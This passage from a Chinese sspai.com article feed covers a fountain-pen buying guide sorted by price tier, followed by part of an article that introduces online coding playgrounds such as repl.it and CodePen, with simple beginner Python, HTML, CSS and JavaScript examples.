以下划成一档，是因为在这个价位段中，无论是挑笔身设计、挑笔尖材质、挑品牌还是笼统地挑性价比，你都能找到至少一支在单独一方面够得上条件的笔。但同样地，这个价位的钢笔组成非常复杂，坑也最多，型号更新也较为频繁。在挑选时，还是要尽可能地寻找相关参数和体验报告来辅助购买决策。这个价位的钢笔品控大多也不够稳定，需要一定运气成分。</p>\n<h3>国产暗尖钢尖笔可能是你的童年</h3>\n<p>很多人第一次接触钢笔可能就是英雄、永生这些经典的国产老牌，但可惜的是，这么多年过去，永生已经消失，其品牌被英雄实业收购，又授权给了其他的厂家，市面上的永生已经大多是新厂货了。随着当年的库存逐渐消耗，现在想要淘到老永生和老英雄已经不太容易了。</p>\n<p>但是，如果考虑上价格因素，无论现产与否，有两个型号的英雄钢笔是随时可以推荐的：其一是英雄 616 中号，其二是英雄 329-2。两款价格在 9-15 元左右，有非常合适的性价比。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/b041f5a27485314561688e2ecf81aca0.png\"></figure><p>英雄 616 就是曾经最经典的英雄钢笔，暗尖设计、笔握上方一道观墨窗、超大储墨量。但需要注意的是，616 目前也有不少的衍生型号，那个最经典的是 616 中号，衍生的诸多型号实际体验都有些差距。虽然即使是中号 616 也有不少的品控问题，但既然考虑到这个分类了，肯定是有一定<strong>情怀因素</strong>在的，还是尽量寻找经典款比较合适。其次就是 329-2，这也是比较典型的国产暗尖笔型号，同样，329 也有很多衍生系列，但相对评价较好的是 329-2 这一分支，据说这是当年的出口型号。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/fee1178c9dafdc3efcf07b926e548b68.png\"></figure><p>这两款暗尖笔承载了太多的国民记忆，但它们年代久远、技术陈旧也是事实，<strong>实际的书写体验可能不够优秀</strong>。其次，这个价格区间里想买到一直完美钢笔是纯粹的运气活，你可能需要一定的调整技术。我不建议采用一次买十支然后一支支挑选的方法，有那个闲钱不如去买一些更好的钢笔，花给 616 真的没有必要。严格来讲，它们不算「好的钢笔」，而是「经典的钢笔」，所以这两个型号更适合那些想<strong>找回老钢笔记忆</strong>，或者<strong>打算随便买一支钢笔日用</strong>的朋友。</p>\n<p>目前的国笔市场可谓一片混乱，所以我也不敢贸然推荐那些新厂子或者新品牌的钢笔。如果你对它们有兴趣的话，注意实用主义者尽量不要买金属外壳，不要买笔杆过粗过细的；特别想要金属的，笔握也尽量不要采用金属材质；购买之前多看评价、评测和体验，确保没有大的结构问题即可。</p>\n<h3>最便宜的日产钢笔体验装</h3>\n<p>在讨论外国钢笔时，常常笼统地把它们分为两大类：日产和欧美产。究其原因，主要还是日本和欧美地区在笔尖打磨、出墨量、笔尖弹性等各方面书写要求的差异所致。大致来讲，欧美钢笔更注重圆滑、顺畅，在较粗的笔尖上表现更好；日系钢笔则与国产钢笔要求类似，讲求打磨上利于出锋，较细的笔尖也要表现良好，因为汉字系统笔画繁复，要求纤细且清晰。虽然具体写成什么样子还是要看人，但在细笔尖的控制上，日系钢笔毫无疑问地能拔得头筹。</p>\n<p>这个价格的日系钢笔我推荐以下两类：</p>\n<h4>彩墨体验器，白金 Preppy 和百乐 Petit</h4>\n<p>对于一些没有体验过彩墨，但又想买来玩玩的朋友来说，Preppy 和 Petit 都是不错的选择，因为它们都支持墨囊供墨，而且官方有比较鲜艳的彩色可选。两支的价格基本在 20 元上下浮动，它们的笔尖虽然没什么特点，但书写体验都对得起这个价格。彩墨用完之后可以换墨囊，也可以做一些小改装继续使用。我自己的桌面上就常常放着一支 Preppy，用来划线标高亮，便宜好用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/5e4d2ec86b38b411a5dca484ed35337f.png\"></figure><h4>学生党最爱的百乐日用钢尖们</h4>\n<p>百乐 78G 在国内的销量一直特别好，好到它的价格都比我第一接触它时涨了几十块。这款钢笔起初主打的就是便宜好用，细尖的出品也比较稳定，对于需要大量爬格子塞小字的学生党来说十分友好。类似采用了这一套笔尖系统的百乐钢笔还有 17G，和 78G 的主要差别是上墨方式不同，17G 没有上墨器，是直接在笔杆里滴墨水，因此储墨量非常巨大。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/01ea151519a06d8f56d8eccc399aee2f.png\"></figure><p>金属杆的 88G 整体质感要比 78G 更好，笔尖体验则相差不多，都是硬滑为主，比较适合速记，而且作为金属杆的钢笔，它的<strong>重心并没有明显的偏高</strong>——这正是我不推荐绝大多数国产金属杆钢笔的原因。如果喜欢比较可爱的外形，还可以选择百乐 Kakuno 笑脸钢笔。88G 的价格大约在 130 元左右，剩余三个型号则集中在 70-90 元。</p>\n<h3>外观党永远的爱</h3>\n<p>对于追求笔身设计的人来说，Lamy 和 Kaweco 是两个绕不开的牌子。Lamy Safari 系列出色的外形设计不仅带动了 Lamy 的销量，甚至养活了一众国内的小笔厂，你在各处都能看见仿制的 Safari。十分讽刺的是，Safari 的写感其实并不算好，Lamy 本身的钢尖品控就非常成问题，尤其是细尖，甚至会出现山寨货比真货好写的情况。但如果要挑一支钢笔随身携带随时写，质量正常的 Safari 以及铝制笔杆的 Al-Star 还真的是不错的选择，因为它们太像中性笔了，你不需要适应，掏出纸笔就能开写，它无趣，但确实是稳定地无趣。在外出速记时，这种无趣反而是优点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/bb5557668d4cbf4f636b4ea582ad6103.png\"></figure><p>类似地，采用公模笔尖，只重视外观设计的 Kaweco 也因为出挑的外形获得了不少青睐。Kaweco Sport 系列主打的就是口袋便携，短短一支笔，笔帽反扣就是正常尺寸。写着确实不出彩，但它真的太好看了——被此外形所毒结果入手出手过两三次 Sport 的我如是说。Lamy 和 Kaweco 的这些型号价格波动幅度较大，受配色影响也很大，很难给出参考价。尤其 Lamy，购买时需要仔细确实店家资质与论坛、贴吧评价。但可以确定的是，除非你特别喜欢某个限定配色、联名或是决定拿来送礼物，Lamy 都是不值得在官方价格入手的。</p>\n<h3>最经典的国产金笔</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/f42ac0d6339d2a4befac59cc7383d34f.png\"></figure><p>现产的所有国产金笔中，英雄 100 当之无愧是经典中的经典。脱胎于当年「赶超派克 51」的华孚 100 英雄金笔，英雄 100 在这么多年里始终保持生产，成了老型号中几乎仅存的金笔遗产。暗尖设计的 14K 金尖触纸后那种微妙的弹性能让你明显感受到别样的魅力。对于喜欢暗尖的人来说，英雄 100 就是最合适的日用笔了，14K 金尖、瓷实的结构、低调的外观，它把钱花在了最值得升级的那些地方。同样地，英雄 100 也有非常多的衍生型号，一定就只买最基础的款，并且最好是半钢款——即钢笔帽塑料笔杆。全钢的英雄 100 在上满墨水后还是会有微妙的重心偏高，对手小的人来说感受会更加明显。半钢款英雄 100 售价为 265 元。</p>\n<h2>300-799 元：进阶钢笔有玩头</h2>\n<p>预算上升到这个层级后，你就能接触到更多真正算得上优秀，甚至足够退烧的钢笔了。不少钢笔品牌会在这个价位出至少一支带有品牌最大特点，但又没有把配置拉满的「体验级」进阶钢笔。它能让你体验到这一品牌最大的魅力所在，又没有贵气到让你不敢拿去日用。对不太钟意英雄 100 这样暗尖钢笔的人来说，这一片空间就是最大的游乐场。但同样地，有不少非常具有特色的手感在这个价格段完全缺失。各位还是按照自己的预算考虑即可。</p>\n<p>与 1-299 价格区间的钢笔相比，本价位段大多是经典型号，构成比较稳定，有大量的评测和体验文章可供参考。而且通常情况下，该价位无论钢尖还是金尖都会选用更加耐磨的铱粒，笔尖磨损的速度会略有减缓。</p>\n<h3>「日系御三家」的 14K 金笔们</h3>\n<p>在这三家放在世界范围内都很优秀的钢笔厂商里，百乐是实打实的冠军选手，这点毋庸置疑。和剩下两家相比，百乐最大的特点就是它在任何一个价位段都有十分优秀的产品。其实这三家在低端系列都采用了类似的策略，就是只开发一款笔尖和一套供墨系统，而百乐的低端笔尖比白金和写乐品质好了太多。到了这个价位，接触到金尖（和高端钢尖）产品之后，白金和写乐的技术特点就能逐渐显露出来了。</p>\n<h4>写乐 14K 系列</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/72c253ea1e3bc176a63c25350104eb4f.png\"></figure><p>我个人非常喜欢写乐，因为他们的 14K 金尖是我用过最合手的<s>，但他们的钢尖也是我用过最烂的</s>。相比于其他的 14K 尖，写乐可能由于厚度和形状设计特点，手感是偏硬弹的，属于很好控制，速记和练字都能驾驭得住的类型，泛用性比较高。采用这一系列笔尖的有三种，分别是 14K「鱼雷」「天冠」和「四季织」，具体的型号和系列比较混乱，但这三类可以视为只有外形差别。在整个御三家的中端系列金笔中，写乐 14K 是在我看来最适合日用的，价格区间在 500-750 元之间，随配色和外观变化。</p>\n<h4>白金 3776 系列</h4>\n<p>作为白金的当家系列，3776 承载了太多的期望，以至于每年 3776 都要搞点限量色，甚至出现过钢尖款与金尖款共用 3776 名号的状况。当然，这里我要讲的主要是金尖的 3776。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/256b1ec15718c6668b014b955b83bd61.png\"></figure><p>同样是 14K 金尖，白金的书写体验可以说独树一帜：不同于一般金尖的顺滑，3776 有一种特殊的阻尼感，书写时你会感到一种独特的摩擦力，再加上白金的笔尖本身略微偏软弹，让 3776 成了一支不适合速记的钢笔，有传言认为这可能是因为日本不少纸张相对较滑，3776 专门做了调试。不少人对白金的书写手感意见颇大，但相对的，这种出挑的手感也让另一部分人对 3776 爱不释手。它在二手市场和一手市场的热度都很高，是典型的人人都值得一试，但评价两极分化的钢笔。价格区间 500-750 元，随配色变化。</p>\n<h4>百乐 5 号尖 14K 系列</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/6aac2f488971c56f2c8aa46fbcd10718.png\"></figure><p>百乐的 14K 系列就比较有花样了。比较经典的是百乐 Custom 74，这是一款采用了经典的「鱼雷」造型的金笔，采用了百乐的 5 号金尖。我在几年前有一段时间把百乐 74 作为日用笔，使用下来的体验非常复杂——我最终出掉了它，但时不时还想购回这支笔。如果让我用一个字归纳上面那些钢笔的特点，写乐 14K 是「硬」，白金 3776 是「涩」，但百乐 74 我始终找不到合适的形容。它弹吗？有点。它滑吗？有点。它的手感非常微妙，多软一点多弹一点就离开了日用范围。大部分人不见得会对 5 号尖一见钟情，但大多也犯不上讨厌。同样采用了 5 号尖的还有百乐 Heritage 92，它抛弃上墨器换上了活塞上墨，增加了一些玩笔的乐趣。74 价格区间大约 550-720 元，92 价格区间大约 750-820 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/76b7d21d46e6ac0601277c5456554121.png\"></figure><p>这个价位区间内，百乐还有一款复古路线的口袋笔，Elite 95s，价格大约在 450-650 之间。它并不是写乐经典的 5 号尖，整体是以「便携」为基本思路设计的。比起之前的各个型号，Elite 95s 就是中规中矩的金尖手感，没什么明显的特点，很容易控制。我自己现在还有一支，非常便携，适合日用。我甚至不小心摔过它一次，尖都弯了，找了把镊子掰直了捋顺了照样用，某种程度上这也是金尖笔才能体会到的小便利。</p>\n<h3>Lamy 2000，欧美钢笔中的一朵奇葩</h3>\n<p>我一直觉得 Lamy 是一家很会做生意的公司。他们的大部分钢笔型号都采用了同一个尺寸的笔尖，无论金尖还是钢尖，所以剩余的研发经费可以全都花在机械结构<s>和调色</s>上。之前我提到的 Safari、Al-Star 这些钢尖产品，和 Studio 这样高端一些的钢尖，以及像是 Accent 和 Dialog 这些上千的高端金尖笔，其实都是可以互换笔尖的。他们的钢尖水平非常一般，但金尖还真的有点特点。所以在我看来 Lamy 最好的使用方法，就是买一支喜欢颜色的 Safari，然后换一个极细的金尖。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/df7c5a4c52fe1f886c106328790b83d7.png\"></figure><p>但 2000 不一样，2000 是唯一在售并且采用了非标笔尖的 Lamy 钢笔。由于几年前一位钢笔吧吧友的 Lamy 2000 被快递投递成了酒，这支笔在国内的钢笔爱好者中就有了「杜康」的名号（，并不是因为什么奇妙的比喻）。不同于他们其他产品笔尖打磨风格的大大咧咧，2000 意外地适合中文书写。虽然有些轻微的横粗竖细，但它半明尖独特的软糯手感和极易出锋的笔尖打磨让 2000 成了这个价位欧美钢笔中少有的中文利器。其次，它包豪斯风格的设计经久不衰，谁能想到这个现代感十足的造型来自 1966 年呢？Lamy 2000 有玻璃纤维版和全金属版，出于重量考虑推荐玻璃纤维版，价格区间 700-850 元。</p>\n<h2>800 元以上：只剩预算的问题</h2>\n<p>对大部分品牌来说，到达这个价位之后，你之前可能碰到的各种小问题基本就解决得差不多了。但到达这个价位，我有必要拿出来推荐的钢笔反而更少了，因为愿意用这个价钱购买钢笔的人，基本上已经了解了自己需要的钢笔类型，或是根本不需要了解钢笔。因此，我只拿一些有特点的作为例子，简单介绍一下这一层级的钢笔有什么看点。</p>\n<h3>「龙鸟犀水派」，钢笔五大家</h3>\n<p>这个合称现在看来难免有些令人神伤，因为其中的「犀」犀飞利和「水」威迪文都几乎成了时代的眼泪，经典系列基本都快停产完了，剩下的几乎是个空壳。剩余的「龙」万宝龙、「鸟」百利金和「派」<s>少数派</s>派克还过得不错，只是龙彻底走了高端路线，派在低端市场玩得不亦乐乎，鸟出了爱好圈就无人知晓了，靠物美价廉的墨水打开知名度。</p>\n<p>我们抛开限量钢笔不谈，万宝龙的 146 算是量产系列中最平衡的一款。大小适合亚洲人偏小的手型，同时保留了万宝龙经典的活塞上墨设计。手感更是没得挑剔——因为万宝龙并不是一个找代工的奢侈品牌来做钢笔，而是一个钢笔厂家被收购后把自己做成了奢侈品——他们真的会做钢笔，而且无论活塞装置精度、笔杆精度还是笔尖打磨，都是实打实的一流水平。价格约 3000 元起。你也可以试试他们的墨水，性质比较一般，但时不时会出现限量色，高跟鞋样式的墨水瓶也是一大特点，大约 140-200 元/瓶。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/7bcaf79e6f28b045e86a5162659f2c8c.png\"></figure><p>百利金则相对平民化一点。作为百利金金尖系列中最便宜的一款，M400 有百利金代代相传的竖条外观，有经典的活塞上墨，大小也更适合较小手掌日用。但比起更旗舰的 M800 它缺点儿沉稳，比起 M200 的钢尖又缺了点品控，维持 M400 地位的，是它弹性适中的手感，和便捷的笔尖总成拆装。百利金各个阶段出产的笔尖总成手感都有些差异，不少人乐于尝试不同阶段的百利金笔尖。M400 价格约 1400 元起。当然，你还是可以从最基础的墨水开始，百利金闻名遐迩的 4001 系列墨水品质非常不错，颜色齐全，各种规格折合大约 1 元/ml。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/bc229f93b49df7d0eb07194281a73cae.png\"></figure><p>派克的低端系列优秀作品屈指可数，但到了高端系列，Duofold 世纪还是值得一提的。世纪系列也是细分型号众多，外形和子型号数不胜数，各个年代的 Duofold 手感和打磨方式也都各有不同。但可惜，我只在专柜试过一次 Duofold，此后就和它无缘了，具体的型号差别也了解得不多。</p>\n<h3>百乐：我会玩一些特别的东西</h3>\n<p>日系御三家其实都有他们的高端品类，比如写乐的大型 21K 和巅峰之作「长刀研」。这里我想拎出来讲的是两个比较独特的系列，它们属于百乐比较炫技的产品，但确实仍然留在日用范围。它们代表了钢笔高端品系的另一个方向。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/c5a505ea46f190cbb9c43bcbde0da1a5.png\"></figure><p>百乐 Capless 是比较少见的按动钢笔。全系搭载了 18K 金尖，我个人感觉手感比较软弹，反而适用于速记，用来练字就显得太过粘滞。Capless 在 1963 年的最初代是旋转出尖，类似 Lamy 的 Dialog 3，后续产品改成了按动出尖。出尖口有一个机械结构，笔尖收回时自动挡住，防止墨水蒸发无法一笔出墨。笔夹刚好给手指固定了握位，夹进口袋时又能让钢笔倒置进一步防漏。标准版的 Capless 是黄铜制，比较有分量；后续他们开发了十周年版（Decimo），把笔身改为铝制，更加轻巧，也更适合日用。Capless 价格区间 900-1200 元，Decimo 版 650-1000 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/0105c8566622a5851fabe9ae4b1810ef.png\"></figure><p>还有一些人可能不知道自己到底适合什么软硬度的笔尖，即使是同一种材质，薄厚、形状、开缝长度不同，最终呈现的书写感受也是不同的。于是百乐又开发了 Justus 95，这是一支能自行改变笔尖软硬度的钢笔，默认的 14K 金笔尖开缝非常长，Justus 95 附加了一个旋转控制的挡板块，可以通过调整挡板的位置调整开缝大小，进而影响写感的软硬度。在钢笔博主 The Nibsmith 的<a href=\"https://www.youtube.com/watch?v=eo2l1mIujIM\" target=\"_blank\">测试</a>中，Justus 通过这样的调节，可以在一支笔上做到英文书法要求的软弹，和日常速记要求的硬滑兼顾。该型号价格区间 1200-1800 元。</p>\n<p>除了我提到的这些型号之外，钢笔的世界还有大把的新鲜事物可以探索。如果你有自己的钢笔体验和推荐，或者对各种钢笔有其他疑问，欢迎在评论区交流。</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/66901\" target=\"_blank\">我为什么还在使用钢笔？</a></li>\n<li><a href=\"https://sspai.com/post/66526\" target=\"_blank\">不买可以先收藏 04：让你笔下生花的个性墨水</a></li>\n<li><a href=\"https://sspai.com/post/66128\" target=\"_blank\">不买可以先收藏 03：如何选择一支好用的中性笔</a></li>\n<li><a href=\"https://sspai.com/post/67081\" target=\"_blank\">不买可以先收藏 05：如何选择一本好用的纸质笔记本</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注<a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，感受更多有趣的生活好物 💸</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67584"},{"title":"开箱即用的编程平台，让学习代码之路弹射起步","date":"2021-07-07 06:28:08","description":"\n<h2>前言</h2>\n<p>对于很多想要尝试学习编程的新手来说，当他们饶有兴致地阅读相关的编程教材或观看有关的教学视频时，浇灭他们学习热情的，不是 Coding 或编程语言的复杂性，而是学习之初就要经历一系列繁复、容易出错的<strong>搭建环境</strong>地狱。</p>\n<p>搭建环境不仅对于新手来说是个地狱，对于开发人员来也是个头疼的问题。有的时候我们就只是想把在自己机子上已经能跑通的代码，顺利地部署到实际使用的服务器上；又或者是能让其他同事帮我们，一起 Debug 或是进行一些 Code Review。重新搭建环境的过程既费时又费力，在过程中可能还会出现其他未曾遇到过的问题。</p>\n<p>所以对于开发人员来说，大部分人都不想重新再装一遍环境或重新配置自己的电脑，毕竟这个过程往往都是吃力不讨好，更不用说没有一些编程基础，或者想要入门编程的新手，看到搭建环境的相关内容时头都大了。</p>\n<p>所以，对于学习编程的新手来说，如果存在一个不需要搭建环境就能直接敲代码的地方，那这真的就是太「For Human」了！</p>\n<h2>交互式的 Playground</h2>\n<p>对一个零基础、毫无编程经验的新手来说，我都十分推荐通过 <strong>REPL</strong> 这种交互式方式来学习编程语言。</p>\n<p>所谓的 REPL，即为「Read-Eval-Print Loop」四个单词的首字母缩写，意为「读取-求值-输出」循环这么一个过程<sup class=\"ss-footnote\" href=\"https://zh.wikipedia.org/wiki/%E8%AF%BB%E5%8F%96%EF%B9%A3%E6%B1%82%E5%80%BC%EF%B9%A3%E8%BE%93%E5%87%BA%E5%BE%AA%E7%8E%AF\" title=\"维基百科词条\" footnote-id=\"1\">1</sup>。</p>\n<p>比如我们可以在 Python 中通过 REPL 并使用 <code>turtle</code> 库在交互式界面中进行绘图。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/4cb95e9ea49443ce80a7aef8bf4c9aa6.gif\"></figure><p>在交互式环境中，每当我们敲下不同的命令，都可以从 REPL 过程中获取到计算机的反馈信息，以确保我们是否是有效的或正确的输入。</p>\n<p>大部分动态类型脚本语言的解释器本身都支持 REPL 模式，比如 Python、JavaScript 等；当然一些静态类型编译语言也同样实现了相应的 REPL 模式，比如 Scala REPL、JShell（Java 9）等，帮助新手更好地学习这门编程语言。</p>\n<h3>repl.it</h3>\n<p>无论是脚本语言还是编译型语言，对于新手来说不应该陷入到搭建环境的陷阱中，而是直接进行纯粹的编程体验。</p>\n<p>所以，像 <a href=\"https://replit.com/\">repl.it</a> 这样的网站就提供了十分适合每一位想要学习的新手，或是有基础想要学习新语言的程序员，直接在线 Coding 的环境。</p>\n<p>正如 replit 官网描述的那样：</p>\n<blockquote><p>OUR MISSIONOUR MISSION Is to make programming more accessible. We build powerful yet simple tools and platforms for educators, learners, and developers.<br>我们的使命就是让编程容易上手。（因此）我们也为编程教育者、学习者以及开发者构建了强大且简单的工具和平台。</p></blockquote>\n<p>当然 replit 支持了大约有 50 多种编程语言，当中不仅包含目前使用度最广且常年霸榜的「常青树」，还包含了像 <a href=\"https://www.rust-lang.org/\">Rust</a> 这样出世没多久的后起之秀。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/59263cb1bea6d5c25ac75b5c4654c20d.png\"><figcaption>repl.it语言支持</figcaption></figure><p>replit 有自己的商业模式和付费计划，但从个人练习的角度来说，免费的模式就已经足够一个人去练习并入门了。</p>\n<p>我们只需要注册之后，点击左侧的 <code>New Repl</code> 选项并选择一门你想学习的编程语言之后，就可以看到 replit 已经为你将学习的编程环境准备就绪了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/aaa5de27dbe7791caaa44a4add88abb3.png\"></figure><p>之后我们只需要在里面任意玩耍即可！比如我新建一个 Python 的 REPL 之后，就可以拥有一个 IDE 一样的开发环境界面，此时我们不仅可以通过 Console 控制台看到命令执行的情况，还能通过 Shell 来使用 Linux 相关的命令。</p>\n<p>在 <code>greet.py</code> 文件中，我们可以简单写下一段代码：</p>\n<pre class=\"language-python\"><code>def greet():\n    print(\"👋 Hello, SSPAI!\")\n    print(\"~~~~~~~~~~~~~~~~~~~~\\n\")</code></pre>\n<p>在 <code>main.py</code> 文件中，我们不仅能够写一些正常开发的代码，还能引用刚刚我们编写的 <code>greet.py</code> 文件中的 <code>greet()</code> 函数：</p>\n<pre class=\"language-python\"><code>import requests\nfrom pprint import pprint\nfrom greet import greet\n\n\nr: requests.Response = requests.get(\"https://httpbin.org/get\")\nif r.status_code == 200:\n    response = r.json()\n    greet()\n    pprint(response, indent=2)</code></pre>\n<p>这里我们通过 <code>requests</code> 库访问 <a href=\"https://httpbin.org/\">httpbin</a> 这一用于简单的 Web 测试站点，然后访问成功的时候将访问结果以 JSON 形式赋值，并调用一下我们前面写好的 <code>greet()</code> 函数，最后将访问得到的 JSON 结果输出打印。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/8b2d8abc3f53205804d1be3a1f2ed3ef.gif\"></figure><h2>codepen.io</h2>\n<p>对于学习前端的新手来说，能在一个界面里直接同时并排书写 HTML、CSS 和 JavaScript 代码实在是再幸福不过了，毕竟前端「所见即所得」的方式有时候比后端的反馈来得更加直接。</p>\n<p>在看 <a href=\"https://element.eleme.cn/#/zh-CN\">ElementUI</a> 的文档时，我发现它提供的一个在线示例网站十分符合我上述的要求，能够让我们在一屏中直接预览到所有代码，而这个网站也是我经常在其他编程相关的 Youtuber 中出现的 <a href=\"https://codepen.io/\">CodePen</a>。</p>\n<p>和 repl.it 一样简单，注册之后我们只需要按照网站引导操作即可，之后就可以直接在创建好的「Pen」中进行练习。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/000cf18a2fa7fc62ebdfc73f52d3ff24.png\"></figure><p>我们可以直接在一个 Pen 书写 HTML、CSS 和 JavaScript，同时 CodePen 还允许我们进行一些简单的相关设置，如是否自动保存、语法解释器等，我们可以点击对应部分左上角的小齿轮进入到设置窗口根据自己的需要进行设置。</p>\n<p>当我们创建好一个用于编程的 Pen 之后，就可以进入到如图所示的页面布局，这里你可以通过右上角的「Change View」选项进行修改。</p>\n<p>从布局中我们可以看到 HTML、CSS 和 JS（JavaScript）是依次垂直排列的。首先我们在 HTML 块中，输入英文输入法模式下的 <code>!</code> 感叹号，此时 CodePen 会为我们提供自动补全的选项，该功能主要是通过 <a href=\"https://docs.emmet.io/\">emmet</a> 语法来实现，所以当按下 Tab 键之后会直接帮我们在 HTML 块中自动补全，一个基本的网页框架。此时需要我们填入的部分只有 <code>&lt;body&gt;&lt;/body&gt;</code> 标签部分：</p>\n<pre class=\"language-htmlembedded\"><code>&lt;body&gt;\n  &lt;h1&gt;\n    👋 Hello, \n    &lt;a href=\"https://sspai.com/\"&gt;SSPAI&lt;/a&gt;\n  &lt;/h1&gt;\n  &lt;div&gt;\n    &lt;iframe src=\"https://sspai.com/\" frameborder=\"0\"&gt;\n    &lt;/iframe&gt;\n  &lt;/div&gt;\n&lt;/body&gt;</code></pre>\n<p>这里首先是主要由两个部分组成，一个是标题 <code>h1</code> 的部分，当中为「SSPAI」几个字母加上了跳转链接，第二个部分是在盒子模型 <code>div</code> 中通过 <code>iframe</code> 标签将少数派的网页嵌入，并通过 <code>frameborder</code> 参数将嵌入的边框消去。</p>\n<p>接着我们可以修改 CSS 样式来稍微对页面中的元素进行「外貌」上的修饰：</p>\n<pre class=\"language-css\"><code>body {\n  text-align: center;\n}\n\nh1&gt;a {\n  text-decoration: none;\n  color: red;\n}\n\niframe {\n  height: 720px;\n  width: 1280px;\n}</code></pre>\n<p>根据花括号可以拆成三个部分，第一个部分主要是设置整个网页文字内容的对齐方式为居中对齐，这也就意味着在 <code>body</code> 标签之内的所有文字都会受到影响；第二个部分主要是通过 CSS 选择器的语法，选择 <code>h1</code> 下的 <code>a</code> 标签，将其带有链接样式的下划线去除，并将文字颜色调整为简单的红色；最后一部分主要就是设置嵌入网页的长宽。</p>\n<p>之后我们可以再稍微试一试 JS 代码：</p>\n<pre class=\"language-javascript\"><code>const h1 = document.getElementsByTagName('h1');\nconsole.log(h1[0])\nh1[0].style.color = 'blue'</code></pre>\n<p>最后的这段 JS 代码中，主要是通过 <code>document</code> 对象根据特定的方法取到 <code>h1</code> 标签，一方面将其输出打印在 console 控制台中，另一方面就是通过编码的方式将标题中的 <code>Hello</code> 单词颜色改成蓝色。</p>\n<p>可以说，对于新手来讲，通过 CodePen 的这种「一屏统筹所有」的方式感觉，更容易让人感受到编程过程中的「所见即所得」，能及时看到自己在编码过程中的效果如何。</p>\n<h2>其他</h2>\n<p>除了前面介绍的第三方站点之外，有的编程语言其官方为了让学习者或使用者快速体验或上手使用这门编程语言，也提供了关于该语言的交互式环境。</p>\n<p>比如 Apple 为了推广自家的 <a href=\"https://developer.apple.com/swift/\">Swift</a> 语言，最早在 WWDC 2016 上也推出了用于教育和学习的 <a href=\"https://www.apple.com.cn/swift/playgrounds/\">Swift Playgrounds</a>，我们可以在每个 iPad 上通过它来体验用 Swift 编程的乐趣。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/8a657b8b2d332e9f7c262e5c4a6af36b.png\"><figcaption>图源 <a href=\"https://www.apple.com.cn/swift/playgrounds/\" target=\"_blank\">Apple官网</a></figcaption></figure><p>又比如我以前在简单接触 <a href=\"https://www.scala-lang.org/\">Scala</a> 这门 JVM（Java Virtual Machine，即 Java 虚拟机）系的编程语言时，就通过官方的 <a href=\"https://scastie.scala-lang.org/\">Scastie</a> 来进行练习。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/259ed23616e002fb6ca9362ab7bf0c1d.png\"></figure><p>还有就是我在去年十月份期间入门学习 <a href=\"https://zh.wikipedia.org/zh-hans/Go\">Go</a> 语言 —— 这一诞生于 Google 家的编程语言时，也是通过官方自带的 Go Playground 来进行练习。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/54c47b6224ade6bb91c91545830b94e4.png\"></figure><p>不过由于这门语言自带「404」属性，所以可能需要一些特殊的魔法方法才能 Touch 到或是通过国内开发者自己搭建的 <a href=\"https://play.studygolang.com/\">镜像版本</a> 来练习。</p>\n<h2>基础的 Cookbook：菜鸟教程</h2>\n<p>除了上面介绍的一些纯运行环境的站点之外，还有许多既包含了一些相对基础的知识，同时又提供了在线练习环境的站点，比如我以前会经常性浏览的 <a href=\"https://www.runoob.com/\">菜鸟教程</a>。</p>\n<p>菜鸟教程提供了大部分编程语言的基础内容，对于那些只是暂时想了解或体验语言语法的人来说，无疑是个很好的 Cookbook。只要你想要学习或了解的编程语言不是那么<strong>冷门</strong>，那么进入到菜鸟教程的官方网站之后，你一般能找到要学习的编程语言的相关内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/03/251de0971a4679da6f0d26dbcc8db2e6.png\"></figure><p>除了我们能在上面浏览到相关内容之外，我们点击其页面上方的「菜鸟工具」之后，首先映入眼帘的就是菜鸟教程为我们提供的「编译工具」选项，它本质上也就是等同于上面介绍站点的在线运行环境，我们可以一边在上面学习，也一边实践。</p>\n<figure class=\"image ss-img-wrapper\"><img 